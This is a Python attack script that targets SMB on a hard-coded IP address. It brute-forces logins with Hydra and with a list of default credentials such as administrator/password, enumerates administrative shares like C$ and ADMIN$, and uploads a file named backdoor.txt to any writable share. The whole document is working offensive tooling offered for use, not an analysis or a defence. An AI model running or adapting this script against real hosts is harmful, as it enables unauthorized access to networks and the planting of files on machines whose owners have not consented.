import subprocess
import os
import sys
import time

TARGET_IP = "12.13.14.3"
LOGIN_FILE = "login"  # login file
PASS_FILE = "passw"   # password file
LOCAL_FILE = "backdoor.txt"
REMOTE_FILE = "backdoor.txt"

def create_files():
    """Create necessary files if they don't exist"""
    if not os.path.exists(LOCAL_FILE):
        print(f"[*] Creating file {LOCAL_FILE}...")
        with open(LOCAL_FILE, "w") as f:
            f.write("Backdoor file\n")
            f.write(f"Time: {time.ctime()}\n")
            f.write(f"Target: {TARGET_IP}\n")
            f.write("Test file for SMB upload\n")

def run_hydra():
    """Run Hydra with YOUR syntax"""
    print("\n" + "="*50)
    print("[*] Starting Hydra...")
    
    # YOUR syntax: hydra -L login -P passw -o found smb2://12.13.14.3
    hydra_cmd = f"hydra -L {LOGIN_FILE} -P {PASS_FILE} -o found smb2://{TARGET_IP}"
    print(f"[*] Command: {hydra_cmd}")
    
    try:
        # Run Hydra
        result = subprocess.run(hydra_cmd, shell=True, capture_output=True, text=True, timeout=300)
        
        print("[*] Hydra output:")
        print("-" * 40)
        print(result.stdout)
        if result.stderr:
            print("\n[!] Hydra errors:")
            print(result.stderr)
        print("-" * 40)
        
        # Check result
        if result.returncode == 0:
            print("[+] Hydra completed successfully")
        else:
            print(f"[-] Hydra exited with code {result.returncode}")
            
        # Check found file
        if os.path.exists("found"):
            print("[+] File 'found' created, checking...")
            with open("found", "r") as f:
                content = f.read()
                print("[*] Content of 'found' file:")
                print(content)
                
                # Parse login and password
                username = None
                password = None
                
                for line in content.split('\n'):
                    if TARGET_IP in line and "login" in line.lower():
                        # Format: host: 12.13.14.3 login: admin password: pass123
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if "login:" in part.lower() and i+1 < len(parts):
                                username = parts[i+1]
                            if "password:" in part.lower() and i+1 < len(parts):
                                password = parts[i+1]
                        
                        if username and password:
                            print(f"[+] Found credentials: {username}:{password}")
                            return username, password
        else:
            print("[-] File 'found' not created - Hydra didn't find credentials")
            
    except subprocess.TimeoutExpired:
        print("[-] Hydra timeout (5 minutes)")
    except Exception as e:
        print(f"[-] Error running Hydra: {e}")
    
    return None, None

def test_smb_directly():
    """Test SMB directly without Hydra"""
    print("\n" + "="*50)
    print("[*] Direct SMB testing...")
    
    # First check availability
    print("[*] Checking SMB availability...")
    test_cmd = f"smbclient -L //{TARGET_IP}/ -N 2>&1 | head -20"
    result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
    print("[*] Check result:")
    print(result.stdout)
    
    # Test common credentials
    test_creds = [
        ("administrator", ""),
        ("administrator", "admin"),
        ("administrator", "password"),
        ("administrator", "123456"),
        ("admin", "admin"),
        ("admin", "password"),
        ("guest", ""),
        ("", ""),  # empty both
    ]
    
    for user, pwd in test_creds:
        print(f"[*] Testing: {user}:{pwd if pwd else '(empty)'}")
        cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{user}%{pwd}' -c 'exit' 2>/dev/null"
        if subprocess.run(cmd, shell=True).returncode == 0:
            print(f"[+] Works: {user}:{pwd}")
            return user, pwd
    
    return None, None

def get_shares(username, password):
    """Get list of accessible shares"""
    print(f"[*] Getting shares for {username}...")
    
    shares_cmd = f"smbclient -L //{TARGET_IP}/ -U '{username}%{password}'"
    result = subprocess.run(shares_cmd, shell=True, capture_output=True, text=True)
    
    shares = []
    if result.returncode == 0:
        for line in result.stdout.split('\n'):
            if 'Disk' in line or 'IPC' in line:
                try:
                    share_name = line.split()[0]
                    shares.append(share_name)
                except:
                    pass
    
    # If no shares found, try common ones
    if not shares:
        shares = ['C$', 'ADMIN$', 'D$', 'E$', 'IPC$', 'print$', 'NETLOGON', 'SYSVOL']
    
    # Test each share
    accessible_shares = []
    for share in shares:
        test_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'exit' 2>/dev/null"
        if subprocess.run(test_cmd, shell=True).returncode == 0:
            accessible_shares.append(share)
    
    return accessible_shares

def upload_file(username, password):
    """Upload file to server"""
    print("\n" + "="*50)
    print("[*] Trying to upload file...")
    
    # Get accessible shares
    shares = get_shares(username, password)
    
    if not shares:
        print("[-] No accessible shares found")
        return False
    
    print(f"[*] Found {len(shares)} accessible shares: {shares}")
    
    # Try to upload to each share (skip IPC$)
    for share in shares:
        if share == 'IPC$':
            continue  # Can't upload to IPC$
            
        print(f"\n[*] Trying share: {share}")
        
        # Try to upload file
        upload_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'put {LOCAL_FILE} {REMOTE_FILE}'"
        print(f"[*] Upload command: {upload_cmd}")
        
        result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] File uploaded to {share}!")
            print(f"[+] Path: \\\\{TARGET_IP}\\{share}\\{REMOTE_FILE}")
            
            # Verify file exists
            check_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'dir {REMOTE_FILE}'"
            check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
            
            if check_result.returncode == 0:
                print("[+] File verified on server!")
            return True
        else:
            print(f"[-] Upload error: {result.stderr[:100] if result.stderr else 'Unknown error'}")
    
    return False

def main():
    print("="*60)
    print("SMB ATTACK AND FILE UPLOAD")
    print(f"Target: {TARGET_IP}")
    print("="*60)
    
    # Create files if needed
    create_files()
    
    # Check if login/password files exist
    if not os.path.exists(LOGIN_FILE):
        print(f"[-] File {LOGIN_FILE} not found!")
        print("[*] Create file with logins (one per line)")
        print("[*] Example: echo 'admin' > login")
        return
    
    if not os.path.exists(PASS_FILE):
        print(f"[-] File {PASS_FILE} not found!")
        print("[*] Create file with passwords (one per line)")
        print("[*] Example: echo 'password' > passw")
        return
    
    # Get credentials
    username, password = None, None
    
    # Option 1: Hydra
    print("\n1. Trying Hydra...")
    username, password = run_hydra()
    
    # Option 2: Direct testing
    if not username or not password:
        print("\n2. Hydra failed, trying direct testing...")
        username, password = test_smb_directly()
    
    # Option 3: Manual input
    if not username or not password:
        print("\n3. All auto methods failed")
        print("[*] Enter credentials manually")
        username = input("Login: ").strip()
        password = input("Password (Enter if empty): ").strip()
    
    if not username:
        print("[-] No login provided. Exit.")
        return
    
    print(f"\n[+] Using credentials: {username}:{password if password else '(empty)'}")
    
    # Upload file
    if upload_file(username, password):
        print("\n" + "="*50)
        print("[+] SUCCESS! File uploaded to server!")
        print(f"[+] Check: smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
    else:
        print("\n" + "="*50)
        print("[-] Failed to upload file")
        print("[*] Possible reasons:")
        print("    - No write permissions")
        print("    - No access to disk shares")
        print("    - Firewall blocking writes")
        
        print("\n[*] Commands to check:")
        print(f"    smbclient -L //{TARGET_IP}/ -U '{username}%{password}'")
        print(f"    smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
        print(f"    crackmapexec smb {TARGET_IP} -u '{username}' -p '{password}' --shares")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user")
    except Exception as e:
        print(f"\n[-] Error: {e}")
